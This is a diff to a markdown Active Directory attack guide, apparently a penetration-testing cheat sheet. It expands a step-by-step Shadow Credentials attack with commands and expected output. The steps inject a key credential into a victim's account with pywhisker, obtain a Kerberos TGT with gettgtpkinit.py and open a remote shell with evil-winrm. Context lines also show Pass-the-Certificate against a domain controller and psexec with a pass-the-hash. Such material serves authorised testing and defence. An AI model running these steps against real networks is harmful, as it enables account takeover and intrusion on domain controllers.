@@ -5783,7 +5783,7 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
 
 
-**Step 4: Clone the repository and install the dependencies**
+**Step 4: Clone the PKINITtools repository and install the dependencies**
 
 ```bash
 git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -5874,10 +5874,73 @@ impacket-psexec -hashes :fd02e525dd676fd8ca04e200d265f20c 'administrator@'<DC01_
 
 We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. 
 
-**Generate a X.509 certificate and write the public key to the victim user's msDS-KeyCredentialLink attribute**
+**Step 1: Add the Domain Controller to /etc/hosts**
 
 ```bash
-pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <USER> --action add
+echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
+```
+
+**Step 2: Intall `pywhisker`**
+
+```bash
+pip3 install pywhisker
+```
+
+**Step 3: Clone and Set Up `PKINITtools`**
+
+```bash
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install -r requirements.txt
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
+**Step 4: Configure Kerberos (`/etc/krb5.conf`)**
+
+Edit your Kerberos config file:
+
+```bash
+sudo nano /etc/krb5.conf
+```
+
+Replace its content with the following (adjust placeholders):
+
+```bash
+[libdefaults]
+    default_realm = <CORP>.LOCAL
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+
+[realms]
+    <CORP>.LOCAL = {
+        kdc = <DC01_IP>
+    }
+
+[domain_realm]
+    .<corp>.local = <CORP>.LOCAL
+    <corp>.local = <CORP>.LOCAL
+```
+
+This config is required for Kerberos tools to find the realm and KDC manually.
+
+**Step 5: Install Kerberos User Tools**
+
+```bash
+sudo apt install krb5-user -y
+```
+
+During installation, enter the following when prompted:
+
+* **Kerberos servers for your realm:** DC01_IP
+* **Administrative server for your realm:** DC01_IP (same)
+
+**Step 6: Inject Shadow Credentials Using `pywhisker`**
+
+This generates a certificate and adds a new key credential to the victim user's account.
+
+```bash
+pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u <USER> -p '<PASSWORD>' --target <TARGET_USER> --action add
 ```
 
 **Expected Output**
@@ -5891,20 +5954,20 @@ pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <
 # [*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
 # [*] Updating the msDS-KeyCredentialLink attribute of <USER>
 # [+] Updated the msDS-KeyCredentialLink attribute of the target object
-# [*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
-# [+] PFX exportiert nach: eFUVVTPf.pfx
+# [*] Converting PEM -> PFX with cryptography: <FILENAME>.pfx
+# [+] PFX exportiert nach: <FILENAME>.pfx
 # [i] Passwort für PFX: <PFX_PASS>
-# [+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
+# [+] Saved PFX (#PKCS12) certificate & key at path: <FILENAME>.pfx
 # [*] Must be used with password: <PFX_PASS>
 # [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
-In the output above, we can see that a PFX (PKCS12) file was created (`eFUVVTPf.pfx`), and the password is shown.
+> **NOTE:** Make note of the generated `.pfx` file and its password.
 
-**Use this file with `gettgtpkinit.py` to acquire a TGT as the victim**
+**Step 7: Use this file with `gettgtpkinit.py` to acquire a TGT as the victim**
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
+python3 gettgtpkinit.py -cert-pfx <FILENAME>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC01_IP> <CORP>.LOCAL/<TARGET_USER> /tmp/<TARGET_USER>.ccache
 ```
 
 **Expected Output**
@@ -5922,42 +5985,40 @@ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass '<PFX_PASS>' -dc-ip 
 # INFO:minikerberos:Saved TGT to file
 ```
 
-**With the TGT obtained, we may once again pass the ticket**
+**Step 8: Set Kerberos Ticket Cache and Verify**
 
 ```bash
-export KRB5CCNAME=/tmp/jpinkman.ccache
+export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
 klist
 ```
 
 **Expected Output**
 
 ```bash
-# Ticket cache: FILE:/tmp/jpinkman.ccache
-# Default principal: jpinkman@<CORP.LOCAL>
+# Ticket cache: FILE:/tmp/<TARGET_USER>.ccache
+# Default principal: <TARGET_USER>@<CORP>.LOCAL
 
 # Valid starting       Expires              Service principal
-# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/<CORP.LOCAL>@<CORP.LOCAL>
+# 08/04/2025 15:11:12  08/05/2025 01:11:12  krbtgt/<CORP>.LOCAL@<CORP>.LOCAL
 ```
 
 In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
 
+**Step 9: EvilWinRM**
+
 ```bash
-evil-winrm -i dc01.<corp.local> -r <corp.local>
+evil-winrm -i dc01.<corp>.local -r <corp>.local
 ```
 
 **Expected Output:**
 
 ```bash
 # Evil-WinRM shell v3.7
-
-# Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-
-# Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
 # Info: Establishing connection to remote endpoint
-# *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
-# <corp>\jpinkman
+# *Evil-WinRM* PS C:\Users\<TARGET_USER>\Documents>
 ```
+
+**Result:** You now have a shell as the victim user on the Domain Controller or another accessible host.
 
 </details>
 
